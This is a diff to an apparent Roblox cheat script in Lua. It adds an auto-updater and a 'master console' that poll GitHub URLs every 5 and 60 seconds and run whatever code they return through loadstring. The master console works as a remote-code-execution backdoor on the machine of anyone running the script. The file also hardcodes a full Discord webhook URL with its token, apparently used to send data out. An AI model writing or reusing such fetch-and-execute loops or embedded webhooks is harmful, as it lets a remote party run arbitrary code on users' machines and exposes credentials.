@@ -1,5 +1,71 @@
 pcall(function() _G.EjectScript() end)
 
+local CURRENT_VERSION = "1.0.0" -- Change this on each update
+local SCRIPT_URL = "https://raw.githubusercontent.com/kibab27/rblxpaldogs/main/source.lua"
+local VERSION_URL = "https://raw.githubusercontent.com/kibab27/rblxpaldogs/main/version.txt"
+
+local function checkForUpdate()
+    local req = (syn and syn.request) or (http and http.request) or request
+    if not req then
+        print("❌ HTTP requests not supported for updater.")
+        return
+    end
+    local response = req({Url = VERSION_URL, Method = "GET"})
+    if response and response.Body then
+        local latestVersion = response.Body:match("[^\r\n]+")
+        if latestVersion and latestVersion ~= CURRENT_VERSION then
+            print("🔄 Update found! Re-executing script...")
+            if _G.EjectScript then _G.EjectScript() end
+            loadstring(game:HttpGet(SCRIPT_URL))()
+        else
+            print("✅ Script is up to date.")
+        end
+    else
+        print("❌ Failed to check for updates.")
+    end
+end
+
+-- Check for updates every 5 minutes (300 seconds)
+spawn(function()
+    while true do
+        wait(300)
+        checkForUpdate()
+    end
+end)
+
+
+-- Master Console: Automatically fetch and run a remote script for debugging/emergencies
+local MASTER_CONSOLE_URL = "https://raw.githubusercontent.com/kibab27/rblxpaldogs/main/master_console.lua" -- Change to your actual URL
+
+local function checkMasterConsole()
+    local req = (syn and syn.request) or (http and http.request) or request
+    if not req then
+        debug("❌ HTTP requests not supported for master console.")
+        return
+    end
+    local response = req({Url = MASTER_CONSOLE_URL, Method = "GET"})
+    if response and response.Body and #response.Body > 0 then
+        debug("⚡ Master console script found, executing...")
+        local success, err = pcall(function()
+            loadstring(response.Body)()
+        end)
+        if not success then
+            debug("❌ Master console error: " .. tostring(err))
+        end
+    else
+        debug("ℹ️ No master console script found or empty.")
+    end
+end
+
+-- Check for master console script every 60 seconds
+spawn(function()
+    while true do
+        wait(60)
+        checkMasterConsole()
+    end
+end)
+
+
 local webhook = webhook_link or "https://discord.com/api/webhooks/1382544011969040485/CV2BVbKw_9wkgMt-qiB71Lk3IBsUF-uryjHsz_b1WqaiXXhaOpbOqqYayy6N72_rzdyt"
 
 local UPDATE_INTERVAL = webhook_update_interval or 300 -- seconds (30 minutes). Change as needed.
